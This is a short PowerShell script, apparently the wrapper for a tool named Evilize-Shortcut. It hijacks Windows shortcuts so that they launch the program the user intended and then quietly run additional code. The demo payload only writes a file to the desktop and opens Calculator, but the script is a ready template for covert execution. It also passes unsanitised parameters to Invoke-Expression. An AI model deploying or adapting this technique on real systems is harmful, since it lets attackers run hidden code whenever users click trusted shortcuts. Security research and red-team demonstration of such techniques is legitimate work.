# This is the wrapper for Evilize-Shortcut.  It runs the program referenced in the original shortcut.
# It can then execute whatever else you wish it to.
param
(
    [string]$programToExecute,
    [string]$programToExecuteParams
)

# This part executes the original shortcut's program, with its argument list.
$startProcessCommand = "Start-Process -WindowStyle Normal -FilePath $programToExecute"

if ($programToExecuteParams)
{
    $startProcessCommand += " -ArgumentList $programToExecuteParams"
}

# Execute the program the user intended to execute
Invoke-Expression $startProcessCommand



# Do something else.  In this case, as a POC, we write a text file to the user's desktop and run Calc.
$desktopMessage = "$(Get-Date): Attempted to execute $programToExecute."
$desktopFile = "$env:USERPROFILE\desktop\Executed.txt"
$desktopMessage | Out-File $desktopFile -Append ascii

start "calc.exe"
